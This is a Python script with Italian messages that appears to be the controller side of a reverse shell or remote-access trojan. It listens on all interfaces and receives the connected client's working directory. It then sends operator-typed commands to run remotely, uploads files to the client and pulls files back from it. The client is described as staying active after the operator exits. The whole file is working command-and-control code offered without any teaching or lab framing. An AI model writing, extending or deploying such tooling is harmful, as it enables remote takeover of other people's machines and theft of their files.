import os
import helpers as hlp
from termcolor import cprint
from helpers import BudaSocket


def run(port):
    with BudaSocket.get_server('0.0.0.0', port) as server:
        try:
            while True:
                cwd = server.recv_str()

                if not cwd:
                    hlp.print_error('Nessuna risposta dal client')
                    break

                while True:
                    cmd = input(cwd + '>').strip()

                    if cmd.startswith('sendfile'):
                        if cmd == 'sendfile':
                            print('Percorso file locale mancante\n')
                        else:
                            path = cmd.removeprefix('sendfile').lstrip()
                            if os.path.isfile(path):
                                server.send_file(path)
                                break
                            else:
                                print('Percorso file locale inesistente\n')
                    else:
                        server.send(cmd)
                        break

                if cmd == 'gn':
                    cprint('[*] Buonanotte.', 'magenta')
                    break
                elif cmd == 'exit':
                    cprint('[*] Chiusura server, client rimane acceso.', 'green')
                    break
                elif cmd.startswith('grabfile'):
                    data = server.recv()
                    if b'<END_OF_JSON_HEADER>' in data:
                        hlp.tcp_to_file(data)
                        print('File ricevuto con successo\n')
                    else:
                        print(hlp.decode(data))
                    continue

                print(server.recv_str())
        except ConnectionResetError:
            hlp.print_error('Connessione resettata dal client')
        except ConnectionRefusedError:
            hlp.print_error('Connessione rifiutata dal client')
        except KeyboardInterrupt:
            hlp.print_error('Interruzione forzata', False)


if __name__ == '__main__':
    run(hlp.argv_or_default(1, 12345))
